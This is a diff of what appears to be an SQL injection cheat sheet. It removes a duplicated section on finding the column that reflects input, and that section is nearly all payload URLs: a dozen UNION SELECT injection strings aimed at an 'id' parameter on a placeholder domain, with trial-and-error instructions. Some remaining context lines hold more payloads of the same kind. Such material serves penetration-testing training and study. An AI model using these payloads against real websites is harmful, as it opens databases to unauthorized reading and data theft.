@@ -119,25 +119,6 @@ Using a simple query, we determine which of the 4 columns reflect our input usin
 
 Website must successfully load and we will see a number (in our case between 1-4)  
 
-## Find the vulnerable column where information are stored using 'UNION SELECT' query  
-
-Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without **syntax error**. *NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*    
-
-```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```  
-```http://domain.com/index.php?id=-1 Union Select 1,2,3,4-- -```  
-```http://domain.com/index.php?id=-1' Union Select 1,2,3,4-- -```  
-```http://domain.com/index.php?id=1'+UNION+ALL+SELECT+null,null,null,null--+-```  
-```http://domain.com/index.php?id=1' Union Select null,2,3,4-- -```  
-```http://domain.com/index.php?id=1' Union Select 1,null,3,4-- -```  
-```http://domain.com/index.php?id=1' Union Select 1,2,null,4-- -```  
-```http://domain.com/index.php?id=1' Union Select 1,2,3,null-- -```  
-```http://domain.com/index.php?id=.1' Union Select 1,2,3,4-- -```  
-```http://domain.com/index.php?id=-1' div 0' Union Select 1,2,3,4-- -```  
-```http://domain.com/index.php?id=1' Union Select 1,2,3,4 desc-- -```  
-```http://domain.com/index.php?id=1' AND 0 Union Select 1,2,3,4-- -```  
-
-Website must successfully load and we will see a number (in our case between 1-4)  
-
   - If the queries will not work, try the following payloads until you see the number:  
   
 ```http://domain.com/index.php?id=1+UNION+SELECT+1,2,3,4--+-```  
